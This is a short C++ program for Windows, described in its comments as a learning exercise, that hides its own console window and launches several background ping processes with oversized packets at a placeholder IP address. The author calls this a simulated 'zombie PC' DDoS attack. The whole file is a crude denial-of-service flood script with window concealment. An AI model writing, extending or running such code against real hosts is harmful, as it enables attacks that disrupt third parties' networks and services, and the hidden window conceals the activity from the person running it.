//This code was created with learning intentions
//This code will open multiple CMD's pretending to be "zombie PCs" each will ping an IP doing a DDOS attack

#include<iostream>
#include<string.h>
#include<windows.h>

using namespace std;

string texto();								//Texto "text" Function will create the script inserted in CMD
void hideW();								//Hide window Function, will hide the Console of the Compiler 

int main(void){
	hideW();								
	
	string txt = texto();
	const char *command = txt.c_str();
	system(command);
	
	return 0;		
}


string texto(){
	string IP = "Ping InsertIPHere -n 30 -l 62500";		
	string nuevo = "start /b";							
	string ejec = "&";
	string esp = " ";
	string comando, comandoY;
	int n = 5;
	
	for (int i=0; i<=n; i++){
		comando = nuevo + esp + IP + esp; 
		if (i<n){
			comando = comando + ejec + esp;
		}		
		
		comandoY += comando;
	}
	return comandoY;
}

void hideW(){
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}

	
	
